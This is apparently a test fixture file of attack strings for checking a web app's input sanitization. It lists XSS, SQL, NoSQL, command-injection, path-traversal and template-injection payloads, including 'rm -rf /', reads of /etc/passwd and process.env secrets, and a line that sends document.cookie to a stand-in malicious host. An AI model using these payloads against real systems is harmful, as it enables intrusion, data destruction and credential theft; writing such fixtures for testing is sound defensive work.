/**
 * Input Sanitization Test Fixtures
 * 
 * This file contains test fixtures for input sanitization and security validation,
 * including various attack vectors like XSS, SQL injection, script insertion patterns,
 * and other malicious inputs. These fixtures support testing of input validation and
 * sanitization utilities to ensure consistent security protection across all user
 * input fields in the SuperApp.
 */

/**
 * Cross-Site Scripting (XSS) attack vectors
 * These patterns attempt to inject JavaScript that executes in the browser
 */
export const xssAttackVectors = {
  // Basic script tag injection
  basicScriptTag: '<script>alert("XSS");</script>',
  scriptWithImg: '<img src="javascript:alert(\'XSS\');">',
  scriptWithOnError: '<img src="x" onerror="alert(\'XSS\');">',
  
  // Event handler injections
  onloadInjection: '<body onload="alert(\'XSS\');">',
  onmouseoverInjection: '<div onmouseover="alert(\'XSS\');">Hover me</div>',
  onclickInjection: '<button onclick="alert(\'XSS\');">Click me</button>',
  
  // Encoded attacks
  urlEncoded: '%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E',
  htmlEntityEncoded: '&lt;script&gt;alert("XSS");&lt;/script&gt;',
  unicodeEncoded: '\u003Cscript\u003Ealert("XSS");\u003C/script\u003E',
  
  // React-specific vulnerabilities
  dangerouslySetInnerHTML: '{"__html":"<script>alert(\'XSS\')</script>"}',
  jsxInjection: '{() => alert("XSS")}',
  hrefJavascript: '<a href="javascript:alert(\'XSS\');">Click me</a>',
  
  // CSS-based attacks
  cssExpression: '<div style="background-image: url(javascript:alert(\'XSS\'));">CSS XSS</div>',
  cssWithImportant: '<div style="width: expression(alert(\'XSS\'))!important;">CSS XSS</div>',
};

/**
 * SQL Injection attack vectors
 * These patterns attempt to manipulate SQL queries to access or modify data
 */
export const sqlInjectionVectors = {
  // Basic SQL injections
  basicInjection: "' OR '1'='1",
  commentTermination: "'; --",
  unionSelect: "' UNION SELECT username, password FROM users; --",
  batchedQueries: "'; DROP TABLE users; --",
  
  // Blind SQL injection
  blindInjection: "' OR (SELECT COUNT(*) FROM users) > 0; --",
  timeBased: "'; WAITFOR DELAY '0:0:5'; --",
  
  // Advanced techniques
  preparedStatementBypass: "\\'; exec sp_executesql N'SELECT * FROM users'; --",
  hexEncoded: "0x2720554E494F4E2053454C45435420757365726E616D652C2070617373776F72642046524F4D207573657273", // Hex encoded version of ' UNION SELECT username, password FROM users
};

/**
 * NoSQL Injection attack vectors
 * These patterns target NoSQL databases like MongoDB
 */
export const noSqlInjectionVectors = {
  // MongoDB injection
  basicNoSql: '{ "$gt": "" }',
  operatorInjection: '{ "username": { "$ne": null } }',
  orOperator: '{ "$or": [ { "username": "admin" }, { "isAdmin": true } ] }',
  whereExecution: '{ "$where": "this.password.length > 0" }',
  functionExecution: '{ "$where": function() { return true; } }',
  javascriptExecution: '{ "$where": "return db.users.findOne()" }',
};

/**
 * Command Injection attack vectors
 * These patterns attempt to execute system commands
 */
export const commandInjectionVectors = {
  // Basic command injections
  basicInjection: '; ls -la',
  pipeCommand: '| cat /etc/passwd',
  backgroundCommand: '& echo vulnerable &',
  nestedCommand: '$(echo vulnerable)',
  backtickCommand: '`echo vulnerable`',
  
  // Command chaining
  andOperator: '&& cat /etc/passwd',
  orOperator: '|| cat /etc/passwd',
  
  // Encoded commands
  urlEncoded: '%3Bcat%20%2Fetc%2Fpasswd',
  hexEncoded: '\x3B\x63\x61\x74\x20\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64', // ;cat /etc/passwd
};

/**
 * Path Traversal attack vectors
 * These patterns attempt to access files outside the intended directory
 */
export const pathTraversalVectors = {
  // Basic path traversal
  basicTraversal: '../../../etc/passwd',
  windowsTraversal: '..\\..\\..\\Windows\\system.ini',
  
  // Encoded traversal
  urlEncoded: '%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
  doubleEncoded: '%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
  unicodeEncoded: '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
  
  // Bypassing filters
  nestedTraversal: '....//....//....//etc/passwd',
  mixedSeparators: '../\../\../etc/passwd',
};

/**
 * HTML Injection attack vectors
 * These patterns attempt to inject HTML that alters page structure
 */
export const htmlInjectionVectors = {
  // Basic HTML injections
  basicHtml: '<h1>Injected Header</h1>',
  iframeInjection: '<iframe src="https://malicious-site.com"></iframe>',
  formInjection: '<form action="https://malicious-site.com/collect" method="post"><input type="hidden" name="stolen" value="data"><input type="submit"></form>',
  metaRefresh: '<meta http-equiv="refresh" content="0; url=https://malicious-site.com">',
  
  // Content spoofing
  divOverlay: '<div style="position:absolute; top:0; left:0; width:100%; height:100%; background-color:white; z-index:9999;">Fake Content</div>',
  loginForm: '<div style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:white; padding:20px; border:1px solid black;"><h2>Session Expired</h2><form><input type="text" placeholder="Username"><input type="password" placeholder="Password"><button>Login</button></form></div>',
};

/**
 * CSRF (Cross-Site Request Forgery) attack vectors
 * These patterns attempt to trick users into making unintended requests
 */
export const csrfVectors = {
  // Basic CSRF payloads
  imageRequest: '<img src="https://api.example.com/transfer?to=attacker&amount=1000" width="0" height="0">',
  autoSubmitForm: '<form id="csrf-form" action="https://api.example.com/transfer" method="POST"><input type="hidden" name="to" value="attacker"><input type="hidden" name="amount" value="1000"></form><script>document.getElementById("csrf-form").submit();</script>',
  clickjacking: '<style>iframe {opacity: 0.001; position: absolute; top: 0; left: 0; width: 100%; height: 100%;}</style><iframe src="https://legitimate-site.com/transfer"></iframe><button style="position: absolute; top: 300px; left: 300px;">Click me for a prize!</button>',
};

/**
 * Template Injection attack vectors
 * These patterns attempt to exploit template engines
 */
export const templateInjectionVectors = {
  // Basic template injections for various engines
  mustacheInjection: '{{constructor.constructor("alert(\'XSS\')")()}}',
  handlebarsInjection: '{{#with "s" as |string|}}{{{call function.call.call string.sub.apply "alert(\'XSS\')"}}}{{/with}}',
  ejsInjection: '<%= process.env.SECRET_KEY %>',
  pugInjection: '#{process.mainModule.require("child_process").execSync("ls -la")}',
  liquidInjection: '{% assign x = "process.env" | split: "." %}{{x[0][x[1]]}}',
};

/**
 * Nested Object Attack Vectors
 * These objects contain malicious content embedded within nested structures
 */
export const nestedObjectAttackVectors = {
  // Nested XSS in user profile
  userProfile: {
    name: 'John Doe',
    bio: '<script>alert("XSS in bio");</script>',
    contact: {
      email: 'john@example.com',
      website: 'javascript:alert("XSS in website");',
      address: {
        street: '<img src="x" onerror="alert(\'XSS in street\');">',
        city: 'New York',
        country: 'USA',
      },
    },
    preferences: {
      theme: 'dark',
      notifications: true,
      customCss: 'body { background-image: url(javascript:alert(\'XSS in CSS\')); }',
    },
  },
  
  // Nested SQL injection in search parameters
  searchParams: {
    query: 'product',
    filters: {
      category: "' OR '1'='1",
      price: {
        min: 10,
        max: "100; DROP TABLE products; --",
      },
      brand: [
        'Brand1',
        "Brand2' UNION SELECT username, password FROM users; --",
      ],
    },
    sort: {
      field: 'name',
      direction: "asc'; UPDATE users SET isAdmin = true WHERE username = 'attacker'; --",
    },
  },
  
  // Nested command injection in configuration
  configObject: {
    appName: 'SuperApp',
    server: {
      host: 'localhost',
      port: '8080; rm -rf /',
      timeout: 30,
    },
    database: {
      url: 'mongodb://localhost:27017/superapp',
      options: {
        user: 'admin',
        password: 'password`; cat /etc/passwd; `',
        pool: {
          size: '10 & echo vulnerable &',
        },
      },
    },
    logging: {
      level: 'info',
      file: '../../../etc/passwd',
    },
  },
};

/**
 * React-Specific Vulnerabilities
 * These patterns target React-specific security issues
 */
export const reactSpecificVectors = {
  // dangerouslySetInnerHTML attacks
  dangerousInnerHTML: {
    __html: '<script>alert("XSS");</script>',
  },
  dangerousProps: {
    dangerouslySetInnerHTML: {
      __html: '<img src="x" onerror="alert(\'XSS\');">',
    },
  },
  
  // JSX injection attempts
  jsxExpressions: {
    component: '{() => { alert("XSS") }}',
    render: '{eval("alert(\'XSS\')");}',
  },
  
  // Event handler exploits
  eventHandlers: {
    onClick: 'javascript:alert("XSS")',
    onMouseOver: '{() => { document.location="https://malicious-site.com" }}',
  },
  
  // URL-based attacks for React Router
  routerExploits: {
    to: 'javascript:alert("XSS")',
    href: 'javascript:fetch("https://malicious-site.com", {method:"POST",body:JSON.stringify(document.cookie)})',
    redirect: 'data:text/html,<script>alert("XSS")</script>',
  },
};

/**
 * Common input patterns that should be sanitized
 * These are everyday inputs that might need sanitization but aren't necessarily attacks
 */
export const commonSanitizationCases = {
  // HTML content in regular text
  textWithHtml: 'This is <b>bold</b> and <i>italic</i> text',
  textWithEntities: 'Copyright &copy; 2023',
  textWithEmoji: 'I love 😍 this app!',
  
  // Special characters
  specialChars: '!@#$%^&*()_+{}|:"<>?[]\\;\',./',
  quotesAndApostrophes: '"Double quotes" and \'single quotes\'',
  
  // Whitespace handling
  leadingTrailingWhitespace: '  text with spaces  ',
  multipleSpaces: 'text  with    multiple     spaces',
  tabsAndNewlines: 'text\twith\ttabs\nand\nnewlines',
  
  // Numbers and formatting
  phoneNumber: '(123) 456-7890',
  currencyValue: '$1,234.56',
  percentValue: '75%',
};

/**
 * Combined test cases for comprehensive testing
 * These objects combine multiple attack vectors for thorough testing
 */
export const combinedTestCases = {
  // User registration form with multiple attack vectors
  userRegistration: {
    username: '<script>alert("XSS");</script>',
    email: '\'OR 1=1; --@example.com',
    password: 'password`; cat /etc/passwd; `',
    confirmPassword: 'password`; cat /etc/passwd; `',
    firstName: '<img src="x" onerror="alert(\'XSS\');">',
    lastName: 'Doe',
    address: {
      street: '../../../etc/passwd',
      city: 'New York\')); DROP TABLE users; --',
      zipCode: '10001',
      country: '<iframe src="https://malicious-site.com"></iframe>',
    },
    preferences: {
      theme: 'dark',
      newsletter: true,
      bio: '{{constructor.constructor("alert(\'XSS\')")()}}',
    },
  },
  
  // Search form with multiple attack vectors
  searchForm: {
    query: '\'OR 1=1; --',
    filters: {
      category: '<script>alert("XSS");</script>',
      priceRange: '10-100`; rm -rf /; `',
      inStock: true,
    },
    sort: 'price_desc; DROP TABLE products; --',
    page: '1 AND (SELECT sleep(5))',
    perPage: '20\')); alert("XSS"); ((',
  },
  
  // Comment submission with multiple attack vectors
  commentSubmission: {
    author: '<script>alert("XSS");</script>',
    email: 'attacker@example.com',
    website: 'javascript:alert("XSS")',
    content: 'This is a legitimate comment\'OR 1=1; -- with <img src="x" onerror="alert(\'XSS\');"> and some `rm -rf /` commands.',
    rating: '5; DROP TABLE comments; --',
    parentId: '1 AND (SELECT sleep(5))',
  },
};

/**
 * Sanitization bypass attempts
 * These patterns attempt to bypass common sanitization techniques
 */
export const sanitizationBypassVectors = {
  // Bypassing HTML sanitizers
  scriptWithoutClosingTag: '<script>alert("XSS")',
  scriptWithEscapedChars: '<scr\x69pt>alert("XSS");</scr\x69pt>',
  scriptWithMixedCase: '<ScRiPt>alert("XSS");</sCrIpT>',
  scriptWithComments: '<scri<!-- comment -->pt>alert("XSS");</scri<!-- comment -->pt>',
  
  // Bypassing attribute filters
  onErrorSplit: '<img src="x" one="" rror="alert(\'XSS\');">',
  onErrorEncoded: '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
  onErrorHexEncoded: '<img src="x" onerror="\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29">',
  
  // Bypassing URL sanitizers
  dataUrl: 'data:text/html,<script>alert("XSS")</script>',
  vbscriptUrl: 'vbscript:alert("XSS")',
  javascriptWithNull: 'java\0script:alert("XSS")',
  
  // Bypassing SQL sanitizers
  sqlWithComments: '\'/**/OR/**/1=1',
  sqlWithAlternateChars: '\'\u004F\u0052 1=1',
  sqlWithConcatenation: '\' || \'1\' || \'=\' || \'1',
};

/**
 * Export all vectors as a single object for convenience
 */
export const allAttackVectors = {
  xss: xssAttackVectors,
  sql: sqlInjectionVectors,
  noSql: noSqlInjectionVectors,
  command: commandInjectionVectors,
  path: pathTraversalVectors,
  html: htmlInjectionVectors,
  csrf: csrfVectors,
  template: templateInjectionVectors,
  nested: nestedObjectAttackVectors,
  react: reactSpecificVectors,
  common: commonSanitizationCases,
  combined: combinedTestCases,
  bypass: sanitizationBypassVectors,
};